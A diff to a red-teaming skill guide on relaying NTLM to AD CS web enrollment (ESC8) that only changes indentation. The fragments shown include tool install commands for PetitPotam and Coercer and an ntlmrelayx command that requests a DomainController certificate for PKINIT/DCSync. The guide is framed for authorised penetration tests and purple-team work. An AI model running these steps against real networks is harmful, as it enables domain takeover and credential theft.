@@ -1,10 +1,10 @@
 ---
 name: relaying-ntlm-for-adcs-esc8
 description: Uses Impacket's ntlmrelayx.py with a coercion tool (PetitPotam, Coercer,
-  printerbug) to relay NTLM authentication from a coerced domain controller into
-  the AD CS HTTP web-enrollment endpoint (ESC8), obtaining a DC certificate usable
-  via Certipy for PKINIT/DCSync. Use during internal AD penetration tests or purple-team
-  exercises when AD CS Web Enrollment lacks Extended Protection for Authentication.
+ printerbug) to relay NTLM authentication from a coerced domain controller into
+ the AD CS HTTP web-enrollment endpoint (ESC8), obtaining a DC certificate usable
+ via Certipy for PKINIT/DCSync. Use during internal AD penetration tests or purple-team
+ exercises when AD CS Web Enrollment lacks Extended Protection for Authentication.
 domain: cybersecurity
 subdomain: red-teaming
 tags:
@@ -58,7 +58,7 @@ pipx install certipy-ad
 
 # Coercion tools
 git clone https://github.com/topotam/PetitPotam.git
-pipx install coercer            # https://github.com/p0dalirius/Coercer
+pipx install coercer # https://github.com/p0dalirius/Coercer
 # printerbug.py ships with Impacket examples (MS-RPRN)
 ```
 
@@ -98,10 +98,10 @@ Point `ntlmrelayx` at the CA's web-enrollment endpoint and request a `DomainCont
 
 ```bash
 impacket-ntlmrelayx \
-  -t http://ca01.corp.local/certsrv/certfnsh.asp \
-  -smb2support \
-  --adcs \
-  --template DomainController
+ -t http://ca01.corp.local/certsrv/certfnsh.asp \
+ -smb2support \
+ --adcs \
+ --template DomainController
 ```
 
 For relaying a member server/workstation instead of a DC, use `--template Machine` (or `User` for a user account).
